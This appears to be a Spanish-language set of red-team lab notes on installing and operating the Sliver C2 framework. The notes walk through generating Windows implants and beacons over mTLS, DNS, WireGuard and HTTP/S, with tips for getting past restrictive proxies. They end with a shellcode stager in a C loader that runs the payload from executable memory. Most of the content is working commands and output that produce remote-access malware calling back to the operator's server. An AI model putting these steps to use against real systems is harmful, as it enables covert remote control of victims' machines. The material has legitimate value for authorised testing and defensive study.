# Sliver C2 \[in progress]

## Instalación

{% embed url="https://dominicbreuker.com/post/learning_sliver_c2_01_installation/" %}

```bash
sudo su
apt-get install build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64

curl https://sliver.sh/install | sudo bash

# Get latest version url's
curl -s https://api.github.com/repos/BishopFox/sliver/releases/latest \
    | jq -r '.assets | .[] | .browser_download_url' \
    | grep -E '(sliver-server_linux|sliver-client_linux)$'

wget -O /usr/local/bin/sliver-server \                                    
    https://github.com/BishopFox/sliver/releases/download/v1.5.39/sliver-server_linux && \
    chmod 755 /usr/local/bin/sliver-server
wget -O /usr/local/bin/sliver \                                           
    https://github.com/BishopFox/sliver/releases/download/v1.5.39/sliver-client_linux && \
    chmod 755 /usr/local/bin/sliver 

sliver-server unpack --force 
nano /etc/systemd/system/sliver.service
```

{% code title="sliver.service" lineNumbers="true" %}
```apacheconf
[Unit]
Description=Sliver
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=on-failure
RestartSec=3
User=root
ExecStart=/usr/local/bin/sliver-server daemon

[Install]
WantedBy=multi-user.target
```
{% endcode %}

```bash
systemctl daemon-reload
systemctl sliver start
netstat -putona | grep 31337
#==> tcp6  0    0 :::31337      :::*       LISTEN    5362/sliver-server   off (0.00/0/0)
```

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

## Implants y Beacons

### Implant

Vendría a ser el equivalente se tener una shell directa en la máquina víctima, la desventaja es que es muy ruidoso ya que está pendiente al instante de si ejecutamos un comando.

```bash
sliver > generate --mtls 192.168.1.12 --arch amd64 --os windows --format exe --save /var/www/html/

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m30s
[*] Implant saved to /var/www/html/TOUGH_JUMBO.exe

#Flags:
#======
#  -a, --arch               string    cpu architecture (default: amd64)
#  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
#  -m, --mtls               string    mtls connection strings
#  -o, --os                 string    operating system (default: windows)
#  -s, --save               string    directory/file to the binary to

sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888 

# Acá la víctima ejecutó el exe que creamos arriba
[*] Session 7467d5c1 TOUGH_JUMBO - 192.168.1.5:49906 (DESKTOP-0AHIE2G) - windows/amd64 - Tue, 06 Jun 2023 18:08:48 EDT

sliver > sessions

 ID         Name          Transport   Remote Address      Hostname          Username   Operating System   Locale   Last Message                               Health  
========== ============= =========== =================== ================= ========== ================== ======== ========================================== =========
 7467d5c1   TOUGH_JUMBO   mtls        192.168.1.5:49906   DESKTOP-0AHIE2G   MalTest    windows/amd64      en-US    Tue Jun  6 18:12:48 EDT 2023 (1m58s ago)   [ALIVE] 

sliver > use
```



### Beacon

Un beacon funciona igual solo que lo que querramos ejecutar se lo planifica como una tarea que se va a ejecutar a intervalos de tiempos que definamos, ya que es cada este tiempo que el beacon va a estar checkeando por si se le mandaron nuevas instrucciones.

```bash
sliver > generate  beacon --mtls 192.168.1.12 --arch amd64 --os windows --format exe --save /var/www/html --seconds 5 --jitter 2

# Flags
# -J, --jitter             int       beacon interval jitter in seconds (default: 30)
# -S, --seconds            int       beacon interval seconds (default: 60)

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 42s
[*] Implant saved to /var/www/html/BEWILDERED_BRONCHITIS.exe

sliver > use beacons

? Select a beacon:  [Use arrows to move, type to filter]
> 37a16de8-5756-426d-8814-ba7a14c0ff42  BEWILDERED_BRONCHITIS  192.168.1.5:50271  DESKTOP-0AHIE2G  DESKTOP-0AHIE2G\MalTest  windows/amd64
  68bebc27-19d6-40f5-b9b9-7891726a0ac5  BEWILDERED_BRONCHITIS  192.168.1.5:50256  DESKTOP-0AHIE2G  DESKTOP-0AHIE2G\MalTest  windows/amd64

sliver > (BEWILDERED_BRONCHITIS) > execute notepad

[*] Tasked beacon BEWILDERED_BRONCHITIS (6d591e51)

sliver > (BEWILDERED_BRONCHITIS) > tasks

 ID         State     Message Type   Created                         Sent   Completed 
========== ========= ============== =============================== ====== ===========
 6d591e51   pending   Execute        Tue, 06 Jun 2023 23:37:20 EDT     

# Por si queremos convertir el beacon a un implant y no esperar a los intervalos:
sliver > interactive

# El beacon se convirtió en una sesión
sliver > sessions 
 ID         Name                    Transport   Remote Address      Hostname          Username   Operating System   Locale   Last Message                             Health  
========== ======================= =========== =================== ================= ========== ================== ======== ======================================== =========
 5c977c73   BEWILDERED_BRONCHITIS   mtls        192.168.1.5:50452   DESKTOP-0AHIE2G   MalTest    windows/amd64      en-US    Tue Jun  6 23:38:05 EDT 2023 (30s ago)   [ALIVE] 
```

#### DNS  address in Beacon

#### DNS Beacons

```bash
sliver > dns -d dnsc2.labnet.local.

[*] Starting DNS listener with parent domain(s) [dnsc2.labnet.local.] ...

[*] Successfully started job #2

sliver > generate beacon --dns dnsc2.labnet.local --seconds 10 --jitter 0 --save /home/kali/Desktop/Sliver/dns-beacon.exe

[*] Generating new windows/amd64 beacon implant binary (10s)
[*] Symbol obfuscation is enabled
[*] Build completed in 2m6s
? Overwrite existing file? Yes
[*] Implant saved to /home/kali/Desktop/Sliver/dns-beacon.exe

[*] Beacon d04b048f WONDERFUL_SUNBONNET - n/a (DESKTOP-0AHIE2G) - windows/amd64 - Sat, 10 Jun 2023 19:07:20 EDT
```

Se puede pasar también una dirección con nuestro server DNS, y por si llega a fallar la conexión o el servidor dns está caído podemos pasarle la dirección ip aparte.

```bash
sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888 

sliver >  generate beacon --os windows --arch amd64 --format exe --save /home/kali/Desktop/dns-beacon.exe --seconds 5 --mtls kali.dnstest.local,192.168.1.12

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 25s
? Overwrite existing file? Yes
[*] Implant saved to /home/kali/Desktop/dns-beacon.exe

[*] Beacon f40b0b34 FRIENDLY_CATTLE - 192.168.1.11:54656 (DESKTOP-0AHIE2G) - windows/amd64 - Fri, 09 Jun 2023 22:25:53 EDT
```



#### Wireguard

Aparte de **mtls** podemos usar el protocolo wireguard.

```bash
sliver > wg

[*] Starting Wireguard listener ...
[*] Successfully started job #2

sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888 
 2    wg     udp        53   

sliver > generate beacon --wg kali.dnstest.local --arch amd64 --os windows --format exe --save /home/kali/Desktop/wg-dns-beacon.exe --seconds 5

[*] Generated unique ip for wg peer tun interface: 100.64.0.7
[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 32s
[*] Implant saved to /home/kali/Desktop/wg-dns-beacon.exe

```



#### Bypassing HTTP/S Proxys

Se puede dar el caso de un entorno restrictivo en el que no podamos usar mtls, por lo que podemos setear un listener http y otro https, sobre el que podemos intentar que la víctima se conecte. HTTP es igual de seguro que HTTP/S debido a que el contenido de los implantes ya van cifrados, pero se debe tratar igualmente de usar https en primera instancia. Tambien podemos usar el driver **wininet**, que si bien es más propenso a ser analizado nos permite más funcionalidades.

<pre><code>sliver > jobs

[*] No active jobs

sliver > http

[*] Starting HTTP :80 listener ...
[*] Successfully started job #3

sliver > https

[*] Starting HTTPS :443 listener ...

[*] Successfully started job #4

sliver > jobs

 ID   Name    Protocol   Port 
==== ======= ========== ======
 3    http    tcp        80   
 4    https   tcp        443  

<strong>sliver > generate beacon --http kali.dnstest.local,kali.dnstest.local?driver=wininet --seconds 5 --jitter 0 --save /tmp/beacon_http.exe
</strong>
[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 00:00:23
[*] Implant saved to /tmp/beacon_http.exe
</code></pre>

Opciones para customizar wininet:

{% embed url="https://github.com/BishopFox/sliver/wiki/C2-Advanced-Options" %}

### Profiles

Los perfiles nos permiten el no tener que escribir todas las flags al generar un implante o beacon.

```bash
sliver > profiles new --mtls 192.168.1.12 --arch amd64 --os windows --format exe test_profile

[*] Saved new implant profile test_profile

sliver > profiles new beacon  --mtls 192.168.1.12 --arch amd64 --os windows --format exe --seconds 5 --jitter 3 test_beacon

[*] Saved new implant profile (beacon) test_beacon

sliver > profiles generate --save /var/www/html test_profile

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 29s
[*] Implant saved to /var/www/html/IMPORTANT_NAPKIN.exe

sliver > profiles generate --save /var/www/html test_beacon

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 27s
[*] Implant saved to /var/www/html/SAD_DEPRESSIVE.exe
```



## Stagers

Como los payloads generados por Sliver pesan mucho (al menos 10mb al estar compilados en GO), podemos generar nuestro propio shellcode en Sliver (a partir de MSFVenom) y creando programa que ejecute esta shellcode.

### Basic Stager

Para generar el shellcode es necesario crear un perfil con el cual vamos a generar los listener

<pre class="language-bash"><code class="lang-bash">sliver > profiles new  --mtls kali.dnstest.local --skip-symbols --format shellcode --arch amd64 win64shell

[*] Saved new implant profile win64shell

sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #1

sliver > stage-listener --url tcp://kali.dnstest.local:8443 --profile win64shell

[*] No builds found for profile win64shell, generating a new one
[*] Job 2 (tcp) started

sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888 
 2    TCP    tcp        8443 

sliver > generate stager --lhost kali.dnstest.local --lport 8443 --arch amd64 --format c --save /tmp

[*] Sliver implant stager saved to: /tmp/WIDE-EYED_PLANET


#--------------------------------#

cat /tmp/WIDE-EYED_PLANET                
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
<strong>                        . . .
</strong>"\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18"
                        . . .
</code></pre>

Como vamos a usar C para nuestro programa nos debería quedar algo así:

{% code lineNumbers="true" %}
```c
#include "windows.h"

int main()
        {
        unsigned char buf[] = 
                "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
                "\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18"
                "\x48\x8b\x52\x20\x56\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
                                      . . .
                "\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
                "\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
                "\x2a\x0a\x41\x89\xda\xff\xd5";
                
    void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof buf);
    ((void(*)())exec)();

    return 0;
}
```
{% endcode %}

Para posteriormente compilarlo para que funcione en windows con MinGW:

&#x20;`x86_64-w64-mingw32-gcc -o shellexec shellexec.c`



Y al ejecutar el programa compilado obtenemos una conexión (no encriptada) con el host víctima:&#x20;

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

